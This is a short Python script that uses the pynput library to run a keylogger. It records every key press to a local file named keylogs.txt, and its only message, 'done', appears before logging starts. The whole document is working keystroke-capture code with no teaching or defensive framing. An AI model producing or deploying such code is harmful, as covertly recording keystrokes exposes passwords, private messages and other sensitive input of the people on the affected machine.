from pynput import keyboard

def keyPressed(key):
    with open("keylogs.txt", 'a') as logkey:
        logkey.write(str(key) + '\n')

def main():
    print("done")
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    listener.join()

# Call the main function directly
main()